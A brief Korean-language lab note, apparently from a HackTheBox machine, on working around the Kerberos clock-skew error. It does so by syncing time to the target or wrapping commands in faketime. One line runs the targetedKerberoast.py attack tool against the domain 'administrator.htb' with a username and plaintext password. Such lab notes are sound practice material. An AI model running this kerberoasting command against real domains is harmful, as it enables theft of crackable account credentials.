---
sticker: emoji//2692-fe0f
---
### Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
#### 방법 1.
```sh
# NTP audo update disable
sudo timedatectl set-ntp off
sudo ntpdate <ip_address>
```
#### 방법 2.
```sh
# use faketime
ntpdate <ip_address> # 2025-02-09 18:15:16 ...
faketime '2025-02-09 18:16:00' python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```